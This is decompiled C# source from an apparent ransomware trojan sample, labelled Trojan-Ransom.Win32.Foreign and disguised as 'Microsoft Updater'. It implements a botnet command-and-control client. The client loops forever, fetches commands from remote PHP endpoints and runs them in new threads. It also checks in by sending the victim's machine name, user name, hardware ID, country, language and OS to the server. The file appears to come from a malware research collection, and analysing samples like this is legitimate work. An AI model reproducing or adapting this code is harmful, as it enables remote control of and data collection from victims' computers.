// Decompiled with JetBrains decompiler
// Type: Epidemic_HTTP.HTTP
// Assembly: Microsoft Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2B3032-0636-4B8C-A49B-30EA659CCFCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Foreign.neod-4b5461e9b7975d274b77e2b28ee9fc7a71cf3294652993dfd23081524d2a783e.exe

using System;
using System.Threading;
using System.Web;

namespace Epidemic_HTTP
{
  internal class HTTP
  {
    private static string httpDir = (string) null;

    public HTTP(string dir) => HTTP.httpDir = dir;

    public void startHttp()
    {
      if (!Config.debug)
      {
        string[] commands = this.GetCommands(true);
        if (commands != null)
          new Thread(new ThreadStart(new Commands(commands).ProcessCommands)).Start();
      }
      while (true)
      {
        if (!Config.debug)
        {
          string[] commands = this.GetCommands(false);
          if (commands != null)
            new Thread(new ThreadStart(new Commands(commands).ProcessCommands)).Start();
        }
        new Thread(new ThreadStart(this.CheckIn)).Start();
        Random random = new Random();
        Thread.Sleep(Config.min_http_check_time + random.Next(0, Config.min_http_check_time * 2));
      }
    }

    private string[] GetCommands(bool startup) => startup ? HTTP.GetBotInfo(nameof (startup)) : HTTP.GetBotInfo("commands");

    private void CheckIn()
    {
      Flags flags = new Flags();
      Functions.GetWebpageContents(Config.http_dir + "getInfo.php?compname=" + HttpUtility.UrlEncode(Environment.MachineName) + "&compuser=" + HttpUtility.UrlEncode(Environment.UserName) + "&hwid=" + HttpUtility.UrlEncode(Functions.GetProcessorID()) + "&country=" + HttpUtility.UrlEncode(Functions.getCountryCode()) + "&complang=" + Functions.getComputerLanguage() + "&os=" + HttpUtility.UrlEncode(Functions.GetOperatingSystem()) + "&flags=" + HttpUtility.UrlEncode(flags.getFlags()) + "&version=" + HttpUtility.UrlEncode(Config.bot_version.ToString()));
    }

    public static string[] GetBotInfo(string info)
    {
      string str = (string) null;
      switch (info)
      {
        case "startup":
          str = "startup.php";
          break;
        case "commands":
          str = "commands.php";
          break;
      }
      try
      {
        return Functions.GetWebpageContents(Config.http_dir + str).Split(new string[1]
        {
          "<br /><br />"
        }, StringSplitOptions.RemoveEmptyEntries);
      }
      catch
      {
        return (string[]) null;
      }
    }
  }
}
